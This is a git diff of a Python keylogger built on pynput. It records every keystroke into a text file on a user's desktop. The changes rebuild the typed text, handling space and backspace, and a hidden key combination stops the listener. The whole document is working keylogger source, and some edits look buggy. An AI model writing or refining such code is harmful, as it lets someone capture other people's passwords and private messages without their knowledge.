@@ -1,11 +1,16 @@
+
 from pynput import keyboard
 
 # creating a new file named keys
 keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "w")
+keys.close()
+
 
 close_combination = {keyboard.Key.ctrl_r,
                      keyboard.Key.shift_l, keyboard.Key.alt_l}
 current = set()
+
+keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "a")
 
 
 def on_press(key):
@@ -14,15 +19,26 @@ def on_press(key):
         current.add(key)
         if all(k in current for k in close_combination):
 
+            global keys  # to prevent unbound local error< I hope it is working now!
             keys.close()
             listener.stop()
     else:
-        try:
-            keys.write('alphanumeric key {0} pressed\n'.format(
-                key.char))
-        except AttributeError:
-            keys.write('special key {0} pressed\n'.format(
-                key))
+
+        if key == keyboard.Key.space:
+            keys.write(" ")
+
+        elif key == keyboard.Key.backspace:
+            keys.close()
+            keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "r")
+            data = keys.read()
+            keys.close()
+            keys = open(r"C:\Users\Ritick Madaan\Desktop\keys.txt", "a")
+            keys.truncate(len(data)-1)
+        else:
+            try:
+                keys.write(key.char)
+            except AttributeError:
+                keys.write(format(key))
 
 
 def on_release(key):
@@ -31,13 +47,12 @@ def on_release(key):
     except KeyError:
         pass
     try:
-        keys.write('{0} released\n'.format(
-            key))
+        keys.write(key)
     except:
         pass
 
 
-# Collect events until released
+# Collect events until released<
 with keyboard.Listener(
         on_press=on_press,
         on_release=on_release) as listener:
